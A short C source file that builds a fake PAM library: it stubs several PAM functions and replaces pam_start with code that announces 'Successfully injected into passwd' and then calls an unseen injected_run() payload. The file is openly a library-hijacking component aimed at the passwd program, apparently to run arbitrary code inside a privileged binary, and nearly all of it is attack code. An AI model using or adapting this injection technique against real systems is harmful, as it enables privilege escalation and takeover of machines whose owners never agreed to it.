#include <stdio.h>

#include "injected.h"

#define pam_handle_t void

#define nd(func) func{return NULL;}
#define nud(func, r) int func{return r;}

nud(pam_putenv(const pam_handle_t* handle, const char * nv), 0)

nd(const char *pam_getenv(pam_handle_t *pamh, const char *name))

nud(pam_chauthtok(pam_handle_t *pamh, int flags), 0)

nud(pam_end(pam_handle_t *pamh, int pam_status), 0)

nd(const char *pam_strerror(pam_handle_t *pamh, int errnum))

int pam_start(const char *command, const char *something, const void* idk, const void* idk2) {
    printf("Successfully injected into passwd, switching over to new code.\n");
    injected_run();
    printf("Ignore the following error:\n");
    return 2;
}


/*
char *crypt(const char* key, const char* salt) {
    printf("crypt TEST\n");
    return NULL;
}
char *crypt_gensalt(const char *prefix, unsigned long count, const char *rbytes, int nrbytes) {
    printf("crypt TEST\n");
    return NULL;
}
*/